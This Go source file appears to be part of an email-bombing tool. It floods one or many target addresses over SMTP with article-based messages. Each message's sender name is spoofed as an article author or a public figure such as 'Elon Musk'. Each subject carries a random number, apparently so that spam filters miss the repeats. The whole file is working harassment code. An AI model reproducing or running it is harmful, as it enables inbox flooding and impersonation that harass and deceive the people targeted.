package bomber

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
	"gopkg.in/gomail.v2"
)

func SingleBomb(articleChunks <-chan Article, workingChan <-chan []int, wg *sync.WaitGroup, mutex *sync.Mutex, smtpConn *gomail.SendCloser, msgOptions *gomail.Message, smtpCreds *SmtpOpts, pgBar *progressbar.ProgressBar) {
	defer wg.Done()
	article := <-articleChunks
	rounds := <-workingChan
	for range rounds {
		if article.Author == "" {
			article.Author = "Fabrizio Romano"
		}
		rand.New(rand.NewSource(time.Now().UnixNano()))
		randomInt := rand.Intn(1000)
		randNum := strconv.Itoa(randomInt)
		mutex.Lock()
		msgOptions.SetAddressHeader("From", smtpCreds.Username, article.Author)
		msgOptions.SetHeader("Subject", article.Title+" "+randNum)
		msgOptions.SetBody("text/plain", article.Description)
		err := gomail.Send(*smtpConn, msgOptions)
		if err == nil {
			pgBar.Add(1)
		}
		mutex.Unlock()
	}
}

func MultiTargetBomb(articleChunks <-chan Article, emailChunks <-chan []string, wg *sync.WaitGroup, mutex *sync.Mutex, smtpConn *gomail.SendCloser, msgOptions *gomail.Message, smtpCreds *SmtpOpts, numBombs int) {
	defer wg.Done()

	emailList := <-emailChunks
	for _, email := range emailList {
		pgBarDescription := fmt.Sprintf("%s ->", email)
		pgBar := MakePgBar(numBombs, pgBarDescription)
		for i := 0; i < numBombs; i++ {
			article := <-articleChunks
			if article.Author == "" {
				article.Author = "Elon Musk"
			}
			rand.New(rand.NewSource(time.Now().UnixNano()))
			randomInt := rand.Intn(1000)
			randNum := strconv.Itoa(randomInt)
			subject := fmt.Sprintf("%s %s", article.Title, randNum)
			mutex.Lock()
			msgOptions.SetAddressHeader("From", smtpCreds.Username, article.Author)
			msgOptions.SetHeader("To", email)
			msgOptions.SetHeader("Subject", subject)
			msgOptions.SetBody("text/plain", article.Description)
			err := gomail.Send(*smtpConn, msgOptions)
			if err == nil {
				pgBar.Add(1)
			}
			mutex.Unlock()
		}
	}
}

func MakePgBar(numBombs int, description string) *progressbar.ProgressBar {
	pgBar := progressbar.NewOptions(numBombs,
		progressbar.OptionSetWriter(os.Stdout),
		progressbar.OptionShowCount(),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionSetDescription(description),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[green]=[reset]",
			SaucerHead:    "[green]>[reset]",
			SaucerPadding: " ",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)

	return pgBar
}
